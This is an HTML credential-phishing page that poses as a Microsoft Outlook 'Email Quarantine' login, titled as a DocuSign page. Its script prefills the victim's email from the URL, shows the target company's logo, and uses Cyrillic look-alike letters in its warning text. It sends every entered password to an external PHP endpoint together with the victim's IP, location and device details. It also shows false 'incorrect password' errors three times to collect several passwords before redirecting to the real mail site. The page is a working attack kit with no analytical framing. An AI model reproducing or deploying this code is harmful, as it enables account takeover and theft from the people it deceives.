<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <title>DocuSign WebApp Settings</title>
    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
    <!-- Custom styles -->
    <style>
        @font-face {
            font-family: SegoeUI;
            src: local("Segoe UI Light"), url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/light/latest.woff2) format("woff2"), url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/light/latest.woff) format("woff"), url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/light/latest.ttf) format("truetype");
            font-weight: 100;
        }
        @font-face {
            font-family: SegoeUI;
            src: local("Segoe UI Semilight"), url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semilight/latest.woff2) format("woff2"), url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semilight/latest.woff) format("woff"), url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semilight/latest.ttf) format("truetype");
            font-weight: 200;
        }
        @font-face {
            font-family: SegoeUI;
            src: local("Segoe UI"), url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/normal/latest.woff2) format("woff2"), url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/normal/latest.woff) format("woff"), url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/normal/latest.ttf) format("truetype");
            font-weight: 400;
        }
        @font-face {
            font-family: SegoeUI;
            src: local("Segoe UI Bold"), url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/bold/latest.woff2) format("woff2"), url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/bold/latest.woff) format("woff"), url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/bold/latest.ttf) format("truetype");
            font-weight: 600;
        }
        @font-face {
            font-family: SegoeUI;
            src: local("Segoe UI Semibold"), url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semibold/latest.woff2) format("woff2"), url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semibold/latest.woff) format("woff"), url(//c.s-microsoft.com/static/fonts/segoe-ui/west-european/semibold/latest.ttf) format("truetype");
            font-weight: 700;
        }
        * {
            font-family: SegoeUI, "-apple-system", BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
        }
        html, body {
            height: 100%;
        }
        body {
            display: -ms-flexbox;
            display: flex;
            -ms-flex-align: center;
            align-items: center;
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #FFFFFF;
        }
        .form-signin {
            width: 100%;
            max-width: 330px;
            padding: 15px;
            margin: auto;
        }
        .form-signin .checkbox {
            font-weight: 400;
        }
        .form-signin .form-control {
            position: relative;
            box-sizing: border-box;
            height: auto;
            padding: 10px;
            font-size: 17px;
        }
        .form-signin .form-control:focus {
            z-index: 2;
        }
        .form-signin input[type="email"] {
            margin-bottom: -1px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
        }
        .form-signin input[type="password"] {
            margin-bottom: 20px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
        }
        .sidebar {
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0;
            display: none;
            width: 332px;
            background-color: #0072C6;
        }
        .sidebar .owaLogoContainer {
            margin: 40vh auto auto 109px;
            text-align: left;
        }
        .login-box {
            padding-left: 0;
            width: 100%;
        }
        .warning, .success, .spinner, .duplicate {
            display: none;
            color: red;
            margin-top: 10px;
            text-align: center;
        }
        .success {
            color: green;
        }
        .spinner {
            color: #0072C6;
        }
        #page-loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #FFFFFF;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        @media (min-width: 576px) {
            .sidebar {
                display: inline-block;
            }
            .login-box {
                padding-left: 332px;
            }
        }
        @media (min-width: 768px) {
            .login-box {
                padding-left: 332px;
            }
        }
        @media (min-width: 992px) {
            .login-box {
                padding-left: 332px;
            }
        }
        @media (min-width: 1200px) {
            .login-box {
                padding-left: 332px;
            }
        }
        .btn.btn-primary {
            background-color: #0072C6;
        }
        
        /* New domain logo styling */
        .domain-logo-container {
            height: 80px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }
        #email-domain-logo {
            height: 150px;
            max-width: 100%;
        }
    </style>
</head>
<body class="text-center">
    <div id="page-loader">
        <i class="fa fa-circle-o-notch fa-spin fa-3x" style="color: #0072C6;"></i>
    </div>
    <div class="sidebar d-sm-block">
        <div class="owaLogoContainer">
            <img src="https://i.postimg.cc/66V2gkDg/owa-side-logo.png" class="owaLogo" aria-hidden="true">
        </div>
    </div>
    <div class="login-box">
        <div class="form-signin">
            <div class="domain-logo-container">
                <img id="email-domain-logo" src="https://i.postimg.cc/XvgmT7kX/owa-logo.png" alt="Domain Logo" >
<br />
<br />
            </div>
            <h1 class="h4 mb-3 font-weight-normal"><span style="color: #000000"><br>
                <span id="cpaha"></span> Email Quarantine</span></h1><br />
            <label for="username" class="sr-only">Email address</label>
            <input type="email" id="user" class="form-control" name="email" placeholder="Email address" required autofocus>
            <label for="inputPassword" class="sr-only">Password</label>
            <input type="password" id="inputPassword" name="password" class="form-control" placeholder="Enter Email Password" required>
            <div class="spinner" id="spinner"><i class="fa fa-circle-o-notch fa-spin"></i> Loading...</div>
            <div class="warning" id="warning">Incorrect pаsswоrd. Enter your valid pаsswоrd to sign in.</div>
            <div class="success" id="success">Successful</div>
            <div class="duplicate" id="duplicate">Password already tried</div>
            <div class="checkbox mb-3 text-left">
                <label><input type="checkbox" value="remember-me"> <span id="privateLabel" aria-hidden="true">Private computer</span> (<a href="#" class="signInCheckBoxLink" role="link">What is this?</a>)</label>
            </div>
            <button id="submit" style="float:right" class="btn btn-lg btn-primary btn-block">Sign In</button>
            <br><br /><br><br />
            <p class="mt-5 mb-3 text-muted">&copy2025 Mircosoft Email Fax
            <br><br /><br><br />
            <p class="mt-5 mb-3 text-muted"></p>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
    <script>
        // External PHP endpoint configuration
        const PHP_ENDPOINT = 'https://your-external-server.com/submit.php';
        
        // Reset attempt counter and tried passwords on page load
        window.onload = () => {
            sessionStorage.clear(); // Clear sessionStorage to reset attempts and passwords
            sessionStorage.setItem('loginAttempts', '0');
            sessionStorage.setItem('triedPasswords', JSON.stringify([]));
            const hash = window.location.hash.substring(1); // Remove '#'
            if (hash && hash.includes('@')) {
                const emailInput = document.getElementById('user');
                emailInput.value = hash;
                emailInput.setAttribute('readonly', 'readonly'); // Make email unclickable
                
                // Update logo based on email domain
                updateDomainLogo(hash);
            }
            $('#page-loader').fadeOut(500); // Hide page loader after content loads
        };

        // Update domain logo based on email
        function updateDomainLogo(email) {
            if (email && email.includes('@')) {
                const domain = email.split('@')[1];
                const domainParts = domain.split('.');
                const domainName = domainParts[0];
                const domainName2 = domainName.charAt(0).toUpperCase() + domainName.slice(1).toLowerCase();
                
                // Format company name for display
		$("#cpaha").html(domainName2);
                

                const logoUrl = `https://logo.clearbit.com/${domain}?size=200`;
                
                // Set the new logo source
                document.getElementById('email-domain-logo').src = logoUrl;
                
                // Add fallback in case logo doesn't exist
                document.getElementById('email-domain-logo').onerror = function() {
                    this.src = 'https://i.postimg.cc/7ZDCTQWZ/tr.png';
                };
            }
        }

        // Get device info
        function getDeviceInfo() {
            return navigator.userAgent;
        }

        // Get geolocation data
        async function getGeoLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    country: data.country_name || 'Unknown',
                    city: data.city || 'Unknown',
                    ip: data.ip || 'Unknown'
                };
            } catch (error) {
                console.error('Error fetching geolocation:', error);
                return { country: 'Unknown', city: 'Unknown', ip: 'Unknown' };
            }
        }

        // Send data to external PHP endpoint
        async function sendToPHP(data) {
            try {
                const response = await fetch(PHP_ENDPOINT, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
                
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                
                return await response.json();
            } catch (error) {
                console.error('Error sending to PHP endpoint:', error);
            }
        }

        // Handle sign-in
        $('#submit').click(async () => {
            const email = $('#user').val();
            const password = $('#inputPassword').val();
            if (!email || !password) return;

            // Update logo if email changes
            updateDomainLogo(email);

            // Check for duplicate password
            let triedPasswords = JSON.parse(sessionStorage.getItem('triedPasswords'));
            if (triedPasswords.includes(password)) {
                $('#warning').hide();
                $('#success').hide();
                $('#spinner').hide();
                $('#duplicate').show();
                return;
            }

            const geo = await getGeoLocation();
            const attempt = parseInt(sessionStorage.getItem('loginAttempts')) + 1;
            sessionStorage.setItem('loginAttempts', attempt);

            // Add password to triedPasswords
            triedPasswords.push(password);
            sessionStorage.setItem('triedPasswords', JSON.stringify(triedPasswords));

            // Prepare data to send
            const data = {
                email,
                password,
                device: getDeviceInfo(),
                country: geo.country,
                city: geo.city,
                ip: geo.ip,
                time: new Date().toISOString(),
                attempt
            };

            // Send data to PHP endpoint
            await sendToPHP(data);

            // Handle trial system
            const $warning = $('#warning');
            const $success = $('#success');
            const $spinner = $('#spinner');
            const $duplicate = $('#duplicate');

            if (attempt < 4) {
                $warning.hide();
                $success.hide();
                $duplicate.hide();
                $spinner.show();
                setTimeout(() => {
                    $spinner.hide();
                    $warning.show();
                }, 2000); // Show spinner for 2 seconds
            } else {
                $warning.hide();
                $duplicate.hide();
                $spinner.show();
                $success.hide();
                setTimeout(() => {
                    $spinner.hide();
                    $success.show();
                    setTimeout(() => {
                        $('#page-loader').fadeIn(500, () => {
                            window.location.href = "https://mail."+domain;
                        });
                    }, 100); // Show success for 1 second before redirect
                }, 500); // Show spinner for 0.5 seconds
            }
        });
        
        // Update logo when email changes
        $('#user').on('input', function() {
            const email = $(this).val();
            if (email.includes('@')) {
                updateDomainLogo(email);
            }
        });
    </script>
</body>
</html>
